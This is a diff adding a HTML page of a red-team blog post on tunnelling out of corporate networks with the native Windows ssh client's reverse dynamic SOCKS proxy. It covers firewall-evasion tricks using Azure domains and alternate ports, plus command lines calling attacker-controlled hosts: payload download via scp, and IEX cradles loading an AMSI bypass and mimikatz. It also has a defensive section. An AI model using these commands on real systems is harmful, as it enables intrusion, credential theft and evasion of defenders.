@@ -1,0 +1,374 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>SSH Tunnelling to Punch Through Corporate Firewalls – Updated Take on One of the Oldest LOLBINs :: Gladstomych</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="
+In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as &ldquo;the way to do it&rdquo;. If your foothold is (luckily) a Linux server, then you&rsquo;re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/blog/ssh-tunnelling-corporate-firewalls/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="SSH Tunnelling to Punch Through Corporate Firewalls – Updated Take on One of the Oldest LOLBINs">
+<meta property="og:description" content="
+In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as &ldquo;the way to do it&rdquo;. If your foothold is (luckily) a Linux server, then you&rsquo;re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.
+" />
+<meta property="og:url" content="//localhost:1313/blog/ssh-tunnelling-corporate-firewalls/" />
+<meta property="og:site_name" content="Gladstomych" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2024-08-13 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+
+
+<div class="container center">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    ~/gladstomych
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/blog">Blog</a></li>
+        
+      
+        
+          <li><a href="/talks">Talks</a></li>
+        
+      
+        
+          <li><a href="/tools">Tools</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/blog" >Blog</a></li>
+        
+      
+        
+          <li><a href="/talks" >Talks</a></li>
+        
+      
+        
+          <li><a href="/tools" >Tools</a></li>
+        
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/blog/ssh-tunnelling-corporate-firewalls/">SSH Tunnelling to Punch Through Corporate Firewalls – Updated Take on One of the Oldest LOLBINs</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2024-08-13</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/adversary-infrastructure/">adversary-infrastructure</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/initial-access/">initial-access</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/red-teaming/">red-teaming</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p><img src="/blog/ssh-tunnelling-corporate-firewalls/ezgif-7-4b7e7cf968.gif" alt="SSH tunnelling animation"></p>
+<p>In my formative days of learning network hacking, SSH tunnelling was amongst the first tunnelling techniques that I learnt. I still remember trying to repeatedly decode my notes and diagrams on the rather cumbersome syntax of single port forwarding with the -L and -R flags, which at the time was taught as &ldquo;the way to do it&rdquo;. If your foothold is (luckily) a Linux server, then you&rsquo;re blessed with the -D flag to spin up a SOCKS proxy on the foothold itself to access the network via proxychains.</p>
+<p>Fast forward a few years later, in our day-to-day work, be it network pentest or adversary simulation, I&rsquo;ve found my colleagues and I using good ol&rsquo; SSH tunnelling in real engagements not less, but more.</p>
+<p>Quoting what Andy Gill <a href="https://github.com/ZephrFish">@ZephrFish</a> said in SteelCon 2024 a couple of weeks ago:</p>
+<blockquote>
+<p><em>&ldquo;F</em>** C2 frameworks, a tunnel is all you need.&rdquo;*</p>
+</blockquote>
+<p>While I might not feel this as strongly as Andy does, there is more than a pinch of truth in that statement. A good tunnel can often be everything you wanted to execute from the end user laptop. And yet, a Google search &ldquo;SSH tunnelling in pentesting&rdquo; and &ldquo;…in red team engagements&rdquo;, would see most top results still described the &ldquo;old&rdquo; way of punching single port-sized holes with -R and -L, or local dynamic SOCKS with -D, which is actually not at all how we used SSH in our engagements. There are a couple of recent blog posts (linked below) published within the recent 1-2 years describing SSH tunnelling using the Reverse dynamic proxy and their unique spins on it, so I&rsquo;ll avoid as much overlap content as I can and present our tips and tricks about SSH tunnelling, with a focus on getting through firewalls.</p>
+<p>SSH tunnelling is of course not our primary nor sole way to tunnel out of a client&rsquo;s network (<a href="https://labs.jumpsec.com/ligolo-quality-of-life-on-red-team-engagements/">wink wink</a>), but whenever I am in a pinch, and nothing else works, this little tool has served me oh-so-well.</p>
+<p>Shoutout to recent blog posts describing similar flavors of the SSH tunnelling technique:</p>
+<ul>
+<li><a href="https://www.pentestpartners.com/security-blog/living-off-the-land-with-native-ssh-and-split-tunnelling/">Living off the land with native SSH and split tunnelling</a> – by PTP&rsquo;s Joe Blogs in Mar 2024, a concise summary of the fundamental form of this technique</li>
+<li><a href="https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/">SSHishing – Abusing Shortcut Files and the Windows SSH Client for Initial Access</a> – by Red Siege&rsquo;s Alex Reid in Apr 2024 going over the interesting take on using Lnk files to turn the SSH tunnelling command into a phishing payload</li>
+<li><a href="https://trustedsec.com/blog/the-socks-we-have-at-home">The SOCKS we have at Home</a> – by TRUSTEDSEC&rsquo;s Esteban Rodriguez in Oct 2023 detailing creation of a limtedaccess user on the remote server for better Opsec</li>
+</ul>
+<h2 id="lets-cut-to-the-chase">Let&rsquo;s cut to the chase<a href="#lets-cut-to-the-chase" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>The OpenSSH client is natively available in almost all Windows machines with an OS / Service Pack later than early 2018, more specifically Win10 v1709 and Win Server v1803. (To the Windows sysadmin reading this, you don&rsquo;t have to use Putty anymore!)</p>
+<p>Furthermore, the stars were so aligned in 2017 that, right before Microsoft ported OpenSSH to Windows, the OpenSSH project implemented the reverse dynamic proxy feature, a bit obscurely (if you ask me!) reusing the -R flag <a href="https://www.openssh.com/txt/release-7.6">in version 7.6</a>. (This has been explained in the ChangeLog for 7 years but yet not many people are talking about this, which shows that RTFM does, in fact, often pay off.)</p>
+<p>In 2024, corporate laptops or workstations are almost universally on either Windows 10 or 11, and that means the ssh command is, on most pentesting or adversarial gigs, sitting in the PATH of the client&rsquo;s machine without needing us to install or enable anything extra.</p>
+<blockquote>
+<p><em>To make this as unambiguous as I can – the <strong>native</strong> ssh command on Windows 10/11 devices has been allowing anyone to start a reverse &amp; dynamic SOCKS proxy into any internal network since 2017! And that makes it possible to run tools like Impacket scripts, Netexec (formerly Crackmapexec) or Certipy natively behind the SOCKS proxy on a remote Linux server, while to the defender the traffic appears to originate from the compromised machine.</em></p>
+</blockquote>
+<p>And in 2024, many corporate firewalls still allow SSH outbound from workstations, or are configured in such a way that it is relatively trivial to bypass, and blue teams are often not watching ssh being executed because of how much of a LOLBIN it is.</p>
+<h2 id="3-tricks-to-punch-through-corporate-firewalls">3 Tricks to punch through Corporate firewalls<a href="#3-tricks-to-punch-through-corporate-firewalls" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="1-basic-form--r">1. Basic form: -R<a href="#1-basic-form--r" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>On the compromised Windows or Nix machine, run SSH with either the binary&rsquo;s name:</p>
+<pre tabindex="0"><code>&gt; ssh -R PROXY_PORT user@attacker_server.com
+</code></pre><p>Or use the full path, on for example port 8888</p>
+<pre tabindex="0"><code>&gt; C:\Windows\System32\OpenSSH\ssh.exe -R 8888 user@attacker_server.com
+</code></pre><p><em>On assumed breach gigs we have a quick trick to check whether outbound SSH is allowed which I will elaborate in the next section.</em></p>
+<p><img src="/blog/ssh-tunnelling-corporate-firewalls/screenshot1.png" alt="screenshot1"></p>
+<p>Here we assume you have a VPS with a static IP / DNS record pointing to the VPS, on the internet. If you so choose to use password authentication, do set up IP allowlisting on your client&rsquo;s and your own egress IP only to avoid being brute-forced. Then on your VPS / attacking server, set up /etc/proxychains.conf as usual. Specifying the remote server&rsquo;s proxychains.conf to use SOCKS5 would enable the additional compatibility of UDP and thus DNS lookups through the tunnel as well:</p>
+<pre tabindex="0"><code>&gt; socks5 	127.0.0.1 8888
+</code></pre><p>Then you could run your commands on the attacking box with proxychains:</p>
+<pre tabindex="0"><code>&gt; proxychains nmap -sT -F internal_target_ip
+&gt; proxychains nxc smb internal_target_ip -u USER -p PASSWD --shares
+&gt; proxychains secretsdump.py ... and so on
+</code></pre><p>On Red Siege&rsquo;s <a href="https://redsiege.com/blog/2024/04/sshishing-abusing-shortcut-files-and-the-windows-ssh-client-for-initial-access/">SSHishing</a> blog post the author described <a href="https://superuser.com/questions/1489017/login-to-ssh-with-no-password-and-no-ssh-key">not requiring a password OR key</a> to login plus the -o &ldquo;StrictHostKeyChecking=no&rdquo; flag to disable the &ldquo;Are you sure you want to continue connecting (Yes/No/Fingerprint)&rdquo; message so that the command could be inside of an Lnk file or a Malicious Office macro, but I still have reservations regarding not requiring authentication to access your C2 server (even if it&rsquo;s a limitaccess user with /bin/false as default shell).</p>
+<h3 id="2-azure-domain--asn-to-get-pass-firewall">2. Azure domain / ASN to get pass firewall<a href="#2-azure-domain--asn-to-get-pass-firewall" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<h4 id="azure-domains">Azure Domains<a href="#azure-domains" class="hanchor" ariaLabel="Anchor">#</a> </h4>
+<p>A good indication of the client&rsquo;s firewall having absolutely no blocks on SSH is when an SSH host that they almost certainly have no use for is allowed, such as:</p>
+<pre tabindex="0"><code>&gt; ssh [email protected]
+&gt; # if you get a  prompt, you&#39;ve struck gold!
+&gt; # pls don&#39;t do anything abusive or malicious to scanme.nmap.org!
+</code></pre><p>Of course, it is not always so easy that it works right away, and whilst not in assumed breach you wouldn&rsquo;t have the luxury of a PowerShell session to check the client&rsquo;s firewall. So, what if Scanme is not reachable? The first thing I would try is to use a VPS on Azure. The underlying reason is that Windows environments are highly likely to be on Active Directory and most likely Hybrid. There is a high likelihood that the client&rsquo;s stack requires either Microsoft own IPs to be allowlisted, or Azure subdomains to be blanket trusted.</p>
+<p>What I&rsquo;d do is to spin up a VM from Azure and then give it an azure subdomain from the Public IP address settings: Public IP &gt; Settings &gt; Configuration &gt; DNS name label (optional) -&gt; Enter your desired subdomain name.</p>
+<p><img src="/blog/ssh-tunnelling-corporate-firewalls/screenshot2.png" alt="screenshot2"></p>
+<pre tabindex="0"><code>&gt; ssh.exe -R 8888 [email protected]
+</code></pre><p>Something mundane such as msservicesupdate.uksouth.cloudapp.azure.com should be fine. This has been proven to work in many of our engagements.</p>
+<h3 id="asn-to-the-rescue">ASN to the rescue<a href="#asn-to-the-rescue" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Domains tend to have higher success rates on phish emails or C2 callbacks because corporate firewalls tend to block requests to raw non-internal IPs. However, <a href="https://www.microsoft.com/en-us/security/blog/2021/03/26/securing-our-approach-to-domain-fronting-within-azure/">Azure domain fronting</a> (some practitioners use Azure CDN fronting) is actually known to Microsoft themselves too. Perhaps the blue team / Sysadmin in the client knew this and blocked outbound access to *.region.cloudapp.azure.com for example because they know about this technique and give their own DNS hostnames to their Azure VMs?</p>
+<p>In this case even if the subdomain is blocked, you could / should try the raw IP anyway because it is on Microsoft owned ASN. I have had it happen that using the raw IP worked, so it is definitely worth a try when you&rsquo;re desperate. The IP address would be in Microsoft&rsquo;s ASN and there could be an allowlist somewhere that green lights the range.</p>
+<pre tabindex="0"><code>&gt; ssh.exe -R 8888 [email protected](azure_vm_ip)
+</code></pre><h3 id="3-alternative-egress-port">3. Alternative Egress Port<a href="#3-alternative-egress-port" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Sometimes outbound port 22 to the internet is (fortunately or unfortunately) blocked on the client&rsquo;s endpoint. However there&rsquo;s also a catch that not all corporate firewalls inspect the underlying protocol / do SSL stripping and deep packet inspection (so-called Application Layer Firewalls). It is definitely worth a try to set the ssh port to non-22 on your VPS and restart SSHD. Port 80, 443, 53 tend to be good candidates for this to work. I&rsquo;ve sometimes even seen Windows / AD ports outbound to be allowed, stuff I wouldn&rsquo;t expect like NETBIOS(139), KERBEROS(88) , SMB(445), LDAP(389) but sometimes it is needed for certain Azure / Entra interaction. Of course classic service ports like SMTP(25), FTP(21) and so on are also within reason to try, but personally I&rsquo;ve had less luck with those.</p>
+<pre tabindex="0"><code>&gt; # edit /etc/ssh/sshd_config with your favorite text editor
+&gt; Port
+&gt;
+&gt; # save and close
+&gt; # don&#39;t forget to allow inbound on this port from your IP on your cloud provider), then:
+&gt;
+&gt; sudo systemctl restart sshd
+</code></pre><h2 id="bonus-what-else-could-you-do-with-this">(Bonus) What else could you do with this?<a href="#bonus-what-else-could-you-do-with-this" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>There are a couple of use cases other than just running offensive tooling through an available outbound SSH connection:</p>
+<ul>
+<li>
+<p><strong>Getting payloads in and data out:</strong> If you can get SSH out, then either getting payload in or exfiltrate data out via SCP shouldn&rsquo;t be a problem:</p>
+<blockquote>
+<pre tabindex="0"><code>scp.exe [email protected]:/home/user/totally_okay_payload.dll C:\Public\AppData\version.dll
+</code></pre></blockquote>
+</li>
+<li>
+<p><strong>(More) OpSec safe In memory powershell script execution with IEX:</strong> If you have a good Amsi bypass, ssh is a good way to grab it along with other powershell scripts, especially with how scrutinised Invoke-WebRequest is. The common way observed in the wild to invoke scripts is:</p>
+<blockquote>
+<pre tabindex="0"><code>IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://192.X.X.X/invoke-mimikatz.ps1&#39;)
+</code></pre></blockquote>
+<p>In a constrained PS environment the (New-Object) cmdlet would not even work, and secondly this command has been signatured to death so it&rsquo;s probably not a smart thing to do in a covert job. However, you can run one command upon ssh-ing into a host in the format of:</p>
+<blockquote>
+<pre tabindex="0"><code>ssh user@server &#34;command arg arg2 ...&#34;
+</code></pre></blockquote>
+<p>Essentially you can use this to cradle your AMSI bypass with a malicious script like so (this again can also be bundled into the Lnk file or a malicious macro):</p>
+<blockquote>
+<pre tabindex="0"><code>IEX (ssh user@server &#34;/usr/bin/cat /home/user/amsibypass.ps1&#34;); IEX (ssh user@server &#34;/usr/bin/cat /home/user/invoke-mimikatz.ps1&#34;)
+</code></pre></blockquote>
+</li>
+</ul>
+<h2 id="how-to-secure-this">How to secure this?<a href="#how-to-secure-this" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<ol>
+<li>
+<ol>
+<li><strong>Removing the SSH client:</strong>  It is recommended to remove the builtin SSH client for non-technical staff. It can be done by first removing the SSH client with Settings&rsquo; &gt; &lsquo;Apps&rsquo; &gt; &lsquo;Optional Features&rsquo; &gt; Search for &ldquo;OpenSSH&rdquo; and hit Uninstall then reboot. It however is still in System32. Uninstalling the SSH client from the endpoint is not yet complete after this, as described in the PTP blog post. To further remove the binaries:
+<blockquote>
+<pre tabindex="0"><code>takeown /F C:\Windows\System32\OpenSSH /R /D Y
+icacls C:\Windows\System32\OpenSSH /grant administrators:F /T
+rmdir /s C:\Windows\System32\OpenSSH
+</code></pre></blockquote>
+</li>
+<li><strong>Secure the corporate firewall settings:</strong> Even if the SSH client is no longer present in the endpoint, the attacker could still move a LOLBin version (signed by Microsoft) onto the user endpoint, or operate from an internal Linux /Mac machine for example. The first order of business is of course blocking outbound TCP connections on port 22 if it is not needed. I&rsquo;m no firewall expert but for firewalls that support application level operations, SSL stripping with protocol inspection should be performed on ports not meant for SSH (443 and so on) and block connections where the protocols are not matched. There are probably no good recommendations from me for clients who need to allowlist Microsoft ASN IP or Azure subdomains for SSH access unfortunately. If the reader has good ideas on this by all means let me know!</li>
+<li><strong>Monitor for the user endpoints for the SSH binary being called:</strong>  For non-technical staff, the SSH &amp; SCP binaries have little reason to be called at all. A custom alert could be written fire off when SSH.exe or SCP.exe is called (optionally, with filehash matching as well).</li>
+</ol>
+</li>
+</ol>
+<p>In summary, SSH.exe has been bundled with Windows 10, 11 &amp; Windows Server since late 2017 and signed by Microsoft. The reverse dynamic proxy is very powerful and there are a number of tricks that can be used to punch through corporate firewalls to get a reliable tunnel for offensive tooling to compromise entire AD domains. Defenders are recommended to watch for invocation of this binary on endpoints used by non-technical users, or uninstall the feature entirely.</p>
+<hr>
+<p><em>Originally published on <a href="https://labs.jumpsec.com/ssh-tunnelling-to-punch-through-corporate-firewalls-updated-take-on-one-of-the-oldest-lolbins/">JUMPSEC Labs</a></em></p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h"></span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/blog/tokensmith-bypassing-intune-compliant-device-conditional-access/" class="button inline prev">
+        &lt; [<span class="button__text">TokenSmith – Bypassing Intune Compliant Device Conditional Access</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/blog/dns-tunnelling-aws-lambda-part-2/" class="button inline next">
+         [<span class="button__text">What&#39;s in a Name? DNS Tunnelling &amp; AWS Lambda Exploitation (Part 2)</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2026 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
